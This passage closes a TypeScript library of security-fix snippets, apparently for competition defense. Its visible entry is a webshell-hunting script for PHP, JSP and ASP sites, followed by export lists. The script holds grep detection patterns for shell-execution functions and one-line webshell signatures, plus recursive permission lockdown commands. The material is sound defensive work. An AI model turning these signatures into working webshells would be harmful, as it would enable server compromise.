grep -rnE 'eval\\s*\\(|assert\\s*\\(|base64_decode\\s*\\(|gzinflate\\s*\\(|str_rot13|system\\s*\\(|exec\\s*\\(|passthru|shell_exec|popen|proc_open|create_function|preg_replace.*\\/e' \\
  --include='*.php' /var/www 2>/dev/null | head -30

# 一句话特征 (最常见)
grep -rnE '<\\?(php)?\\s*@?\\s*(eval|assert|system|exec|passthru)\\s*\\(\\s*\\$(_POST|_GET|_REQUEST|_COOKIE|_FILES)' \\
  --include='*.php' /var/www 2>/dev/null

# ===== 3. JSP WebShell 特征 =====
grep -rnE 'Runtime\\.getRuntime\\(\\)\\.exec|ProcessBuilder|Class\\.forName.*exec|getClass\\(\\).*forName|Cipher\\.getInstance' \\
  --include='*.jsp' --include='*.jspx' /var/www 2>/dev/null

# ===== 4. ASP/ASPX WebShell =====
grep -rnE 'eval\\s*\\(|Execute\\s*\\(|CreateObject|WScript\\.Shell|Server\\.CreateObject' \\
  --include='*.asp' --include='*.aspx' --include='*.ashx' /var/www 2>/dev/null

# ===== 5. 高熵值文件 (混淆 WebShell) =====
# 需要 python
find /var/www -name '*.php' -exec python3 -c "
import sys, math
from collections import Counter
for f in sys.argv[1:]:
    try:
        data = open(f,'rb').read()
        if len(data) < 200: continue
        c = Counter(data)
        entropy = -sum((v/len(data)) * math.log2(v/len(data)) for v in c.values())
        if entropy > 5.5:  # 阈值可调
            print(f'{entropy:.2f} {f}')
    except: pass
" {} + 2>/dev/null | sort -rn | head

# ===== 6. 可疑文件名 =====
find /var/www -type f -name '*.php*' ! -name '*.php' ! -name '*.phtml' 2>/dev/null
find /var/www -type f -name '.*.php' 2>/dev/null   # 隐藏
find /var/www -type f -regex '.*\\.\\(php5\\|phtml\\|pht\\|phar\\|inc\\)' 2>/dev/null

# ===== 7. 异常权限 (比赛常见: 攻击者写入 777) =====
find /var/www -type f -perm /o+w 2>/dev/null
find /var/www -type f \\( -name '*.php' -o -name '*.jsp' \\) ! -user www-data ! -user apache 2>/dev/null

# ===== 8. 对比备份 (最可靠) =====
diff -rq /var/www /var/www.bak 2>/dev/null

# ===== 9. 已知 WebShell hash 对比 =====
# 可维护一份内网 WebShell md5 库:
find /var/www -name '*.php' -exec md5sum {} + > /tmp/current.md5
# diff /root/known_shell.md5 /tmp/current.md5

# ===== 10. 清理后锁定 =====
chattr -R +i /var/www/html/           # 禁止再写入
find /var/www -type d -exec chmod 755 {} \\;
find /var/www -type f -exec chmod 644 {} \\;`,
    oneliner: `find /var/www -type f \\( -name '*.php' -o -name '*.jsp' \\) -mmin -60 -exec grep -lE 'eval\\(|system\\(|base64_decode\\(|assert\\(' {} \\; 2>/dev/null`,
    verify: `find /var/www -type f \\( -name '*.php' -o -name '*.jsp' \\) -mmin -10  # 清理后应无新增`,
    tags: ['应急', 'webshell', '查杀', 'php', 'jsp', 'asp', 'backdoor'],
  },
];

// ═══════════════════════════════════════
// 导出
// ═══════════════════════════════════════
export const ALL_SNIPPETS: SecFixSnippet[] = [
  ...python, ...php, ...java, ...javascript, ...golang, ...c_cpp,
  ...middleware, ...cms, ...emergency,
  ...shell, ...sql, ...k8s_docker,
];

export const LANGUAGES = [
  { key: 'all', label: '全部' },
  { key: '应急', label: '⚡ 应急' },
  { key: '中间件', label: '🔥 中间件' },
  { key: 'CMS', label: '📦 CMS' },
  { key: 'Shell', label: 'Shell/系统' },
  { key: 'Python', label: 'Python' },
  { key: 'PHP', label: 'PHP' },
  { key: 'Java', label: 'Java' },
  { key: 'JavaScript', label: 'JS/Node' },
  { key: 'Go', label: 'Go' },
  { key: 'C/C++', label: 'C/C++' },
  { key: 'SQL', label: 'SQL/DB' },
  { key: 'K8s/容器', label: 'K8s/容器' },
];
